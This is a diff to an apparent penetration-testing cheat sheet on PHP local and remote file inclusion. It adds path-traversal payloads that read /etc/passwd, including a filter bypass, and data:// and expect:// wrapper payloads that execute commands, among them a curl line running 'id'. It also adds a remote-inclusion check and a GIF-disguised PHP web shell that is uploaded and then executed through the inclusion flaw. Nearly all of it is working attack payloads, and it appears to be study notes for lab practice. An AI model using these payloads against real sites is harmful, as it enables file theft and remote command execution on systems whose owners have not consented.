@@ -3,7 +3,19 @@ http://<SERVER_IP>:<PORT>/index.php?language=
 # ../../../../etc/passwd > basic 
 # ....//....//....//....//etc/passwd > basic bypass. 
 # this avoids: $language = str_replace('../', '', $_GET['language']);
+# which is a Non-Recursive Path Traversal Filter
+
+####################### Encoding ############################
 # use URL encoding
+# some filters filter out special characters like . or /
+# here you can pass the decoded version of your string using burp suite
+
+
+####################### Approved Paths ############################
+
+# access file through the approved path (approved folder)
+<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
+
 
 
 
@@ -19,8 +31,27 @@ zip:///filename_path#internal_filename
 
 # PHP data
 data://text/plain;base64,BASE64_STR
+http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,BASE64_STR&cmd=<terminal_command>
 
 # PHP expect
 expect://command
+curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 
 
+######################## RFI #########################
+# check if it is RFI vulnerable, using the website itself
+http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
+
+#  It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server
+
+
+######################## File Upload #########################
+# Create GIF file that runs shell
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+
+# Upload the file 
+
+# Reload page & view source code to find the path of the uploaded file
+
+# Run file via LFI
+http://<SERVER_IP>:<PORT>/index.php?language=<path_to_file>&cmd=id
